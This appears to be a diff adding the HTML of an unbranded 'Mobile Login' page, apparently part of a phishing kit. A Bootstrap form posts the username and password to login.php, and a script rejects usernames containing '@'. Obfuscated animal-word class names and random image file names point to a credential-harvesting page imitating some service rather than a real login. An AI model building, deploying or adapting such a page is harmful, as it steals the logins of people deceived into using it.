@@ -1,0 +1,94 @@
+<html lang="en"><head>
+<title>Mobile Login</title>
+<link href="fav.ico" rel="shortcut icon" type="image/x-icon">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+</head>
+<body id="id-leao" class="classe-leao">
+<div class="container classe-cobra" style="padding-bottom: 52px" id="id-cabrito">
+<form class="form-signin" action="login.php" onsubmit="return validateForm()" method="POST">
+<div class="text-center mt-2 classe-jumento">
+<img class="classe-elefante" src="moravuzoriolintorewde01.png" alt="" height="32">
+</div>
+<div class="form-inner classe-jumento">
+<div id="error" style="margin-bottom: 2em; text-align: center; display: none">
+<p style="color: #bf2155">We can't find that username and password.</p>
+</div>
+<div class="form-label-group mb-4 classe-jumento">
+<input type="text" id="userId" name="userId" data-validate="userId" class="form-control classe-rinoceronte" placeholder="Username" required="" autofocus="">
+</div>
+<div class="form-label-group mb-4 classe-rinoceronte">
+<input type="password" name="password" data-validate="password" class="form-control classe-rinoceronte" placeholder="Password" required="">
+</div>
+<button class="btn btn-primary btn-block" type="submit" onclick="submitForm();">Sign in</button>
+</div>
+</form>
+</div>
+<footer id="id-macaco" class="d-md-none classe-rinoceronte">
+<img class="" src="bigbigm02.jpg" alt="" width="100%">
+</footer>
+<script>
+		function validateForm(){			
+			document.getElementById("error").style.display = "none";
+			
+			var str = document.getElementById('userId').value;
+							
+			if (str.includes("@")){
+				document.getElementById("error").style.display = "block";
+				return false;
+			} else {
+				return true;
+			}
+		 }
+		</script>
+<style>
+		html {
+		  height: 100%;
+		}
+		body {
+		  min-height: 100%;
+		}
+		body {
+			background: url(bggk.jpg) fixed center top no-repeat;
+			background-size: auto 90%;
+			background-attachment:fixed;
+			align-items: center;
+			padding-top: 12px;
+			
+		}
+		footer {
+			background-color: #fff;
+		}
+		input {
+			border-top: none !important;
+			border-left: none !important;
+			border-right: none !important;
+			border-bottom: 1px solid #ccc !important;
+			border-radius: 0 !important;
+			background-color: transparent !important;
+		}
+		.form-signin {
+			width: 100%;		
+		}
+		.form-inner {
+			width: 100%;
+			/*max-width: 330px;*/
+			background-color: rgba(255,255,255,0.96);
+			padding: 54px 18px;
+			margin: auto;
+			border-radius: 6px;
+			margin-top: 30px;
+		}
+		.btn-block {
+			font-weight: 600;
+		}
+		.container {
+			padding-right: 12px;
+			padding-left: 12px;
+		}
+		</style>
+</body>
+</html> 
